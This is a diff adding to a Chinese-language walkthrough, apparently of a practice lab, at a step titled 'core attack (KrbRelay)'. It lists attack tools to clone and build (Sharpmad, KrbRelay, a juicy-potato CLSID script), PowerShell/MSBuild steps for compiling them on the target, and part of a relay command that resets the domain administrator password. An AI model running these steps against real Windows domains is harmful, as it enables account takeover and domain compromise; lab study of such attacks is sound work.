@@ -124,4 +124,13 @@ Step 5：核心攻击（KrbRelay）
 -ssl \
 -port 10246 \
 -reset-password administrator Lacure77#
+
+工具：
+[★]$ git clone https://github.com/Kevin-Robertson/Sharpmad.git //Sharpmad.csproj
+[★]$ git clone https://github.com/cube0x0/KrbRelay.git //CheckPort.exe  && KrbRelay.exe  这个需要在Pwnbox上的目标windows机器编译不了，需要在本机生成.exe再上传
+[★]$ wget https://raw.githubusercontent.com/ohpe/juicy-potato/refs/heads/master/CLSID/GetCLSID.ps1
+
+PS C:\programdata> Expand-Archive sharpmad.zip //解压
+PS C:\programdata> ls C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe //生成.exe的默认路径
+PS C:\programdata> .\MSBuild.exe sharpmad/sharpmad/Sharpmad.csproj
 ```
